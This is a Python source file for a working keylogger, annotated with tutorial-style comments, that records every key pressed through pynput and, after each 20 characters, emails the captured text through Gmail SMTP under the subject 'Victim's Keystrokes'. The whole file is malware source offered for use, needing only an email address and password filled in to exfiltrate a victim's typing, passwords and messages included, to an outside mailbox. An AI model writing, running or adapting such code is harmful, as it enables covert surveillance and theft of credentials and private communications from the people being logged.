# Import a library that can listen to keyboard events
from pynput.keyboard import Listener

# Import SMTP library used for sending emails
import smtplib

# Libraries used to build an email message
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Variable used to store the captured keyboard input
keystrokes = ""

# This function is triggered every time a key is pressed
def log_happykey(key):
    # Use global variable so we can update the keystroke storage
    global keystrokes
    # Convert key object to string and remove single quotes
    key = str(key).replace("'", "")
    # Print the key to the console for testing
    print(key)

    # Handle special keys and convert them into readable characters

    # If space bar is pressed, convert it into a blank space
    if key == 'Key.space':
        key = ' '
    # If enter key is pressed, convert it to a new line
    elif key == 'Key.enter':
        key = '\n'
    # Ignore shift key
    elif key == 'Key.shift':
        key = ''
    # Represent backspace as "<"
    elif key == 'Key.backspace':
        key = '<'

    # Add the processed key to the stored keystroke string
    keystrokes += key

    # When stored characters reach a certain limit
    # trigger a function that sends the data
    if len(keystrokes) >= 20:

        send_email_with_content(keystrokes)

        # Reset stored keystrokes after sending
        keystrokes = ""


# Function responsible for sending the collected data through email
def send_email_with_content(content):

    # Sender email address
    from_email = "example@gmail.com"

    # Receiver email address
    to_email = "example@gmail.com"

    # Email authentication password
    password = "app_password_here"


    # Create an email object
    msg = MIMEMultipart()

    # Set email headers
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = "Victim's Keystrokes"


    # Attach the collected text content to the email body
    msg.attach(MIMEText(content, 'plain'))


    # Connect to Gmail SMTP server
    server = smtplib.SMTP('smtp.gmail.com', 587)

    # Start encrypted connection
    server.starttls()

    # Login using email credentials
    server.login(from_email, password)

    # Send the email message
    server.sendmail(from_email, to_email, msg.as_string())

    # Close the SMTP connection
    server.quit()


# Start the keyboard listener
# This continuously waits for keyboard input events
with Listener(on_press=log_happykey) as listener:
    # Keep the program running
    listener.join()
